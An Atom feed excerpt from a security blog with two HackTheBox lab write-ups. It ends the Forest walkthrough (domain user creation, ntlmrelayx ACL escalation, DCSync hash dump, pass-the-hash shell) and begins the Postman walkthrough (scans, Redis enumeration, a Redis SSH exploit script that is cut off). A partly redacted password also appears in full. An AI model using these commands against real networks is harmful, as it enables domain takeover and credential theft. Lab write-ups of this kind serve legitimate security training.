&lt;p&gt;Let's create a user and add it in the &lt;code&gt;Exchange trusted subsytem&lt;/code&gt; group.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; shell&lt;/span&gt;
&lt;span class="code-line"&gt;Process 3256 created.&lt;/span&gt;
&lt;span class="code-line"&gt;Channel 1 created.&lt;/span&gt;
&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.14393]&lt;/span&gt;
&lt;span class="code-line"&gt;(c) 2016 Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Users\svc-alfresco\Documents&amp;gt;net user created_01 M&amp;lt;redacted&amp;gt; /add /domain&lt;/span&gt;
&lt;span class="code-line"&gt;net user created_01 Marteau69! /add /domain&lt;/span&gt;
&lt;span class="code-line"&gt;The command completed successfully.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Users\svc-alfresco\Documents&amp;gt;net group &amp;quot;EXCHANGE TRUSTED SUBSYSTEM&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;net group &amp;quot;EXCHANGE TRUSTED SUBSYSTEM&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Group name     Exchange Trusted Subsystem&lt;/span&gt;
&lt;span class="code-line"&gt;Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Exchange configuration, as well as user accounts and groups. This group should not be deleted.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Members&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;EXCH01$                  sol                      svc-alfresco&lt;/span&gt;
&lt;span class="code-line"&gt;The command completed successfully.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Users\svc-alfresco\Documents&amp;gt;net group &amp;quot;EXCHANGE TRUSTED SUBSYSTEM&amp;quot; created_01 /add&lt;/span&gt;
&lt;span class="code-line"&gt;net group &amp;quot;EXCHANGE TRUSTED SUBSYSTEM&amp;quot; created_01 /add&lt;/span&gt;
&lt;span class="code-line"&gt;The command completed successfully.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then launch &lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's ntlmrelayx.py&lt;/a&gt;
with the &lt;code&gt;escalate-user&lt;/code&gt; parameter. We try it by authenticating in our browser on 127.0.0.1.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user created_01&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Protocol Client SMTP loaded..&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Protocol Client SMB loaded..&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Protocol Client MSSQL loaded..&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Protocol Client HTTP loaded..&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Protocol Client HTTPS loaded..&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Protocol Client IMAPS loaded..&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Protocol Client IMAP loaded..&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Protocol Client LDAPS loaded..&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Protocol Client LDAP loaded..&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Running in relay mode to single host&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Setting up SMB Server&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Setting up HTTP Server&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Servers started, waiting for connections&lt;/span&gt;
&lt;span class="code-line"&gt;[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161&lt;/span&gt;
&lt;span class="code-line"&gt;[*] HTTPD: Client requested path: /&lt;/span&gt;
&lt;span class="code-line"&gt;[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161&lt;/span&gt;
&lt;span class="code-line"&gt;[*] HTTPD: Client requested path: /&lt;/span&gt;
&lt;span class="code-line"&gt;[*] HTTPD: Client requested path: /&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Authenticating against ldap://10.10.10.161 as \created_01 SUCCEED&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Enumerating relayed user&amp;#39;s privileges. This may take a while on large domains&lt;/span&gt;
&lt;span class="code-line"&gt;[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161&lt;/span&gt;
&lt;span class="code-line"&gt;[*] HTTPD: Client requested path: /favicon.ico&lt;/span&gt;
&lt;span class="code-line"&gt;[*] HTTPD: Client requested path: /favicon.ico&lt;/span&gt;
&lt;span class="code-line"&gt;[*] HTTPD: Client requested path: /favicon.ico&lt;/span&gt;
&lt;span class="code-line"&gt;[*] User privileges found: Create user&lt;/span&gt;
&lt;span class="code-line"&gt;[*] User privileges found: Modifying domain ACL&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Querying domain security descriptor&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Success! User created_01 now has Replication-Get-Changes-All privileges on the domain&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Try using DCSync with secretsdump.py and this user :)&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Saved restore state to aclpwn-20191105-184250.restore&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Authenticating against ldap://10.10.10.161 as \created_01 SUCCEED&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Enumerating relayed user&amp;#39;s privileges. This may take a while on large domains&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Exception in HTTP request handler: [Errno 32] Broken pipe&lt;/span&gt;
&lt;span class="code-line"&gt;[-] [Errno 32] Broken pipe&lt;/span&gt;
&lt;span class="code-line"&gt;[*] User privileges found: Create user&lt;/span&gt;
&lt;span class="code-line"&gt;[*] User privileges found: Modifying domain ACL&lt;/span&gt;
&lt;span class="code-line"&gt;[-] ACL attack already performed. Refusing to continue&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="dcsync"&gt;DCSync&lt;/h2&gt;
&lt;p&gt;Our right where sufficient to escalate to get the &lt;code&gt;Replication-Get-Changes-All&lt;/code&gt;
privileges on the domain. As mention by &lt;code&gt;ntlmrelayx&lt;/code&gt; we can now use a
&lt;a href="https://adsecurity.org/?p=1729"&gt;DCSync&lt;/a&gt; attack on the domain using
&lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's secretdump.py&lt;/a&gt; to get
the users' passwords hashes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python secretsdump.py &amp;#39;htb.local/created_01:M&amp;lt;redacted&amp;gt;@10.10.10.161&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Using the DRSUAPI method to get NTDS.DIT secrets&lt;/span&gt;
&lt;span class="code-line"&gt;htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::&lt;/span&gt;
&lt;span class="code-line"&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::&lt;/span&gt;
&lt;span class="code-line"&gt;DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="pth"&gt;PTH&lt;/h2&gt;
&lt;p&gt;We can then use the &lt;a href="http://blog.gentilkiwi.com/tag/pass-the-hash"&gt;Path the hash&lt;/a&gt;
technique with
&lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's psexec.py&lt;/a&gt; to login on
the Domain Controller as administrator and get the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python psexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Requesting shares on 10.10.10.161.....&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Found writable share ADMIN$&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Uploading file LgnQUJxD.exe&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Opening SVCManager on 10.10.10.161.....&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Creating service evKq on 10.10.10.161.....&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Starting service evKq.....&lt;/span&gt;
&lt;span class="code-line"&gt;[!] Press help for extra shell commands&lt;/span&gt;
&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.14393]&lt;/span&gt;
&lt;span class="code-line"&gt;(c) 2016 Mirosoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Windows\system32&amp;gt;cd ..&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Windows&amp;gt;cd ..&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\&amp;gt;cd Users&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Users&amp;gt;cd Administrator&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Users\Administrator&amp;gt;cd Desktop&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Users\Administrator\Desktop&amp;gt;type root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;f04815&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;What a journey. This box was classified as easy but probably needed a medium
classification. WinRM is so &lt;em&gt;finicky&lt;/em&gt;. The root part was interesting as it
allowed us to play with Bloodhound and ntlmrelayx which doesn't happen a lot
outside of client environments.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="windows"></category><category term="winrm"></category><category term="PTH"></category><category term="bloodhound"></category><category term="impacket"></category></entry><entry><title>HTB: Postman</title><link href="https://maggick.fr/2020/03/htb-postman.html" rel="alternate"></link><published>2020-03-15T09:30:00+01:00</published><updated>2020-03-15T09:30:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-03-15:/2020/03/htb-postman.html</id><summary type="html">&lt;p&gt;&lt;img alt="Postman Card" class="align-left" src="/media/2020.03/postman_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/215"&gt;Postman&lt;/a&gt; publish on
Novemer the second 2019 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/114053"&gt;TheCyberGeek&lt;/a&gt;.
This box is rated as easy box. It implies a redis server, a &lt;code&gt;id_rsa.bak&lt;/code&gt;, john
the ripper and webmin 1.910.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.03/postman_card.png" alt="Postman Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/215"&gt;Postman&lt;/a&gt; publish on
Novemer the second 2019 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/114053"&gt;TheCyberGeek&lt;/a&gt;.
This box is rated as easy box. It implies a redis server, a &lt;code&gt;id_rsa.bak&lt;/code&gt;, john
the ripper and webmin 1.910.&lt;/p&gt;


&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
&lt;h2 id="nmap"&gt;nmap&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. The box is quit busy so first of all we
run a simple aggressive TCP scan:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Tue Nov 19 16:52:02 2019 as: nmap -p- -sS -oA nmap_all_port -T4 10.10.10.160&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.160&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.090s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65530 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp    open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http&lt;/span&gt;
&lt;span class="code-line"&gt;4444/tcp  open  krb524&lt;/span&gt;
&lt;span class="code-line"&gt;6379/tcp  open  redis&lt;/span&gt;
&lt;span class="code-line"&gt;10000/tcp open  snet-sensor-mgmt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run a version scan on this open ports:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Tue Nov 19 18:32:32 2019 as: nmap -p22,80,4444,6379,10000 -sSV -oA nmap_version 10.10.10.160&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.160&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.087s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE  SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open   http    Apache httpd 2.4.29 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;4444/tcp  closed krb524&lt;/span&gt;
&lt;span class="code-line"&gt;6379/tcp  open   redis   Redis key-value store 4.0.9&lt;/span&gt;
&lt;span class="code-line"&gt;10000/tcp open   http    MiniServ 1.910 (Webmin httpd)&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The open ports are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;22: SSH&lt;/li&gt;
&lt;li&gt;80: a web server&lt;/li&gt;
&lt;li&gt;6379: a redis server&lt;/li&gt;
&lt;li&gt;10 000: another web server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We do not have any information to connect to the SSH server.&lt;/p&gt;
&lt;p&gt;The website on port 80 does not give us anything.&lt;/p&gt;
&lt;p&gt;The website on port 10 000 is a webmin login interface. There is a few exploit
available for it. But none of it works.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;searchsploit webmin&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Title&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;DansGuardian Webmin Module 0.x - &amp;#39;edit.cgi&amp;#39; Directory Traversal&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin - Brute Force / Command Execution&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin 0.x - &amp;#39;RPC&amp;#39; Privilege Escalation&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin 0.x - Code Input Validation&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin 1.5 - Brute Force / Command Execution&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin 1.5 - Web Brute Force (CGI)&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin 1.580 - &amp;#39;/file/show.cgi&amp;#39; Remote Command Execution (Metasploit)&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin 1.850 - Multiple Vulnerabilities&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin 1.900 - Remote Command Execution (Metasploit)&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin 1.910 - &amp;#39;Package Updates&amp;#39; Remote Command Execution (Metasploit)&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin 1.920 - Remote Code Execution&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin 1.x - HTML Email Command Execution&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin &amp;lt; 1.290 / Usermin &amp;lt; 1.220 - Arbitrary File Disclosure (PHP)&lt;/span&gt;
&lt;span class="code-line"&gt;Webmin &amp;lt; 1.290 / Usermin &amp;lt; 1.220 - Arbitrary File Disclosure (Perl)&lt;/span&gt;
&lt;span class="code-line"&gt;phpMyWebmin 1.0 - &amp;#39;target&amp;#39; Remote File Inclusion&lt;/span&gt;
&lt;span class="code-line"&gt;phpMyWebmin 1.0 - &amp;#39;window.php&amp;#39; Remote File Inclusion&lt;/span&gt;
&lt;span class="code-line"&gt;webmin 0.91 - Directory Traversal&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Shellcodes: No Result&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="redis"&gt;Redis&lt;/h2&gt;
&lt;p&gt;The last service is the redis server. We use redis-cli in order to connect to
it and start enumerating using the autocompletion.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# redis-cli -h 10.10.10.160&lt;/span&gt;
&lt;span class="code-line"&gt;10.10.10.160:6379&amp;gt; CONFIG GET dbfilename&lt;/span&gt;
&lt;span class="code-line"&gt;1) &amp;quot;dbfilename&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;2) &amp;quot;authorized_keys&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;10.10.10.160:6379&amp;gt; CONFIG GET dir&lt;/span&gt;
&lt;span class="code-line"&gt;1) &amp;quot;dir&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;2) &amp;quot;/var/lib/redis/.ssh&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A quick Google search for "redis ssh exploit" return this
&lt;a href="https://github.com/Avinash-acid/Redis-Server-Exploit"&gt;github repository&lt;/a&gt;.
We modify the script to include our &lt;code&gt;.ssh&lt;/code&gt; folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Author : Avinash Kumar Thapa aka -Acid&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Twitter : https://twitter.com/m_avinash143&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os.path&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;termcolor&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;script&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ip_address&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/usr/bin/redis-cli&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;PATH1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/usr/local/bin/redis-cli&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;ssh_connection&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="n"&gt;shell&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ssh -i &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;$HOME/.ssh/id_rsa &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;@&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ip_address&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PATH&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PATH1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s1"&gt;*******************************************************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;green&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s1"&gt;* [+] [Exploit] Exploiting misconfigured REDIS SERVER*&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;green&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s1"&gt;* [+] AVINASH KUMAR THAPA aka &amp;quot;-Acid&amp;quot;                                &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;green&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
